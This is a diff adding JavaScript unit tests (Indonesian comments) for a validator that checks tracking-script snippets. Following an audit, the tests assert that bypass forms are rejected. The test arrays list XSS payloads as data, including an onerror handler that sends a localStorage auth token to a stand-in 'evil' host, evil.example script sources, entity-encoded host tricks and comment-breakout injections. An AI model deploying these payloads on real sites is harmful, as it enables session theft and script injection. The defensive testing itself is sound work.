@@ -162,3 +162,61 @@ test('trackingScriptError aman dipanggil untuk nilai kosong/non-string', () => {
   assert.equal(trackingScriptError(undefined), null);
   assert.equal(trackingScriptError(null), null);
 });
+
+// Audit 22 Okt 2026: lima bentuk ini lolos validator lama dan menjalankan JS
+// penyerang di origin alhijaz.co (satu origin dengan token login dashboard).
+test('event handler & atribut selain src/async/defer/data-* ditolak', () => {
+  const W = 'https://secure.watzap.chat/x404.js';
+  const nakal = [
+    `<script src="${W}" onerror="fetch('//evil/'+localStorage.auth_session)"></script>`,
+    `<script src="${W}" onload=alert(1)></script>`,
+    `<script onerror=alert(1) src="${W}"></script>`,
+    `<script src="${W}" ONERROR="alert(1)"></script>`,
+    `<script src="${W}" type="module"></script>`,
+    `<script src="${W}" style="x"></script>`,
+  ];
+  for (const value of nakal) {
+    assert.match(trackingScriptError(value) || '', /Atribut tidak diperbolehkan/, value);
+  }
+});
+
+test('src ganda / data-src tidak bisa menyamarkan src sungguhan', () => {
+  const nakal = [
+    '<script data-src="https://secure.watzap.chat/a.js" src="https://evil.example/x.js"></script>',
+    '<script src="https://secure.watzap.chat/a.js" src="https://evil.example/x.js"></script>',
+    '<script src="https://evil.example/x.js" src="https://secure.watzap.chat/a.js"></script>',
+  ];
+  for (const value of nakal) {
+    assert.ok(trackingScriptError(value), value);
+  }
+});
+
+test('referensi karakter di src (didekode browser sebelum URL di-parse) ditolak', () => {
+  const nakal = [
+    '<script src="https://evil.example&sol;.watzap.chat/x.js"></script>',
+    '<script src="https://evil.example&#47;.watzap.chat/x.js"></script>',
+    '<script src="https://evil.example&#x2f;.watzap.chat/x.js"></script>',
+  ];
+  for (const value of nakal) {
+    assert.equal(trackingScriptError(value), 'Sumber skrip harus dari watzap.chat', value);
+  }
+  // &amp; dan & mentah di query tetap sah.
+  assert.equal(trackingScriptError('<script src="https://secure.watzap.chat/a.js?x=1&amp;y=2&z=3"></script>'), null);
+});
+
+test('komentar yang ditutup browser di tempat lain dari regex ditolak', () => {
+  const nakal = [
+    `${LPWA}<!-- --!><script>alert(1)</script> -->`,
+    `<!--><script>alert(1)</script>-->${LPWA}`,
+    `<script src="https://secure.watzap.chat/a.js"><!--</script><script>alert(1)</script>--></script>`,
+    `<!-- <img src=x onerror=alert(1)> -->${LPWA}`,
+  ];
+  for (const value of nakal) {
+    assert.ok(trackingScriptError(value), value);
+  }
+});
+
+test('tag penutup longgar (</ script>) tidak dianggap menutup script', () => {
+  const value = '<script src="https://secure.watzap.chat/a.js"></ script><script>alert(1)</script>';
+  assert.ok(trackingScriptError(value));
+});
